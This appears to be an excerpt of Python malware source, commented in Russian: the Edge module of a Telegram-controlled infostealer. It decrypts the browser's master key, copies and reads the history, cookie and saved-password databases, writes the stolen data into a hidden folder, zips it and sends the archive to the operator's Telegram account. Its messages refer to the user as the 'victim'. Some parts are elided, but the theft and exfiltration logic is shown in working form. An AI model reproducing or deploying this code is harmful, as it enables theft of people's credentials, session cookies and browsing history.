...
#                                EDGE                                     #
###############################################################################
def Edge(dp, bot, admin_id):  # Простая функция
    @dp.message_handler(text_contains='Логи Edge')  # Если сообщение содержит такой текст
    async def Edges(message: types.Message):  # Асинхронная функция внутри простой, хД
        ...
        try:  # ПоПрОбОвАтЬ
            ...
            async def get_master_key_Edge():  # async функция
                try:  # Попробовать
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State',
                              "r", encoding='utf-8') as f:  # Открытие
                        local_state = f.read()  # file.read
                        local_state = json.loads(
                            local_state)  # Метод считывает строку в формате JSON и возвращает объекты
                    master_key_edge = base64.b64decode(local_state["os_crypt"]["encrypted_key"])  # Декодер
                    master_key_edge = master_key_edge[5:]  # Хз как обьяснить)
                    master_key_edge = win32crypt.CryptUnprotectData(master_key_edge, None, None, None, 0)[
                        1]  # На нём все стиллеры пишут ))
                    return master_key_edge # Возвращение
                except:  # except
                    await bot.send_message(admin_id, 'Жертва не имеет Edge Браузера')  # Провал
            ...
            try:  # Попробовать
                os.makedirs(r'C:\hesoyam8927163\Edge')  # Сделать папку
                ...
                data_path = os.path.expanduser(
                    '~') + r"\AppData\Local\Microsoft\Edge\User Data\Default"  # Уже писал что это в main.py
                files = os.listdir(data_path)  # Показать директорию
                history_db = os.path.join(data_path,
                                          'History')  # Функция join() правильно соединяет переданный путь к одному или более компонентов пути
                shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')  # Шутил ,_,
                c = sqlite3.connect(os.environ[
                                        'USERPROFILE'] + '\\AppData\\Roaming\\history.db')  # Функция `connect() открывает соединение с файлом базы данных
                cursor = c.cursor()  # Курсор
                temp = []  # "Пустая" переменная
                with open(rf"C:\hesoyam8927163\Edge\history-Edge.txt", "a",
                          encoding="utf-8") as history:  # Открытие
                    for result in cursor.execute(HistorySQL).fetchall():  # Цикл
                        data = cursor.execute(HistoryLinksSQL % result[
                            0]).fetchone()  # () Метод execute() помогает нам выполнять запрос и возвращать записи в соответствии с запросом
                    ...
                    results += '''
            {
                ...
                "value": "%s"
                    ...
                    ''' % (result[1], result[7], result[2], http, result[6], secure,
                           decrypt(result[5], get_master_key_Edge()))

                with open(rf"C:\hesoyam8927163\Edge\Cookies-Edge.json", "a", encoding="utf-8") as cookies:
            ...
            try:
                ...
                await bot.send_message(admin_id, 'Жертва не имеет Edge Браузер')
            ...
            try:
                ...
                for r in cursor.fetchall():
                    ...
                    with open(r'C:\hesoyam8927163\Edge\Edge-passwords.txt', "a") as o:
                        o.write(alldatapass)

                shutil.make_archive('edge', 'zip', 'C:\\hesoyam8927163\\Edge')

                await bot.send_document(admin_id, open('edge.zip', 'rb'))
                try:
                    os.remove('edge.zip')
            ...
            await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Edge :(')
            return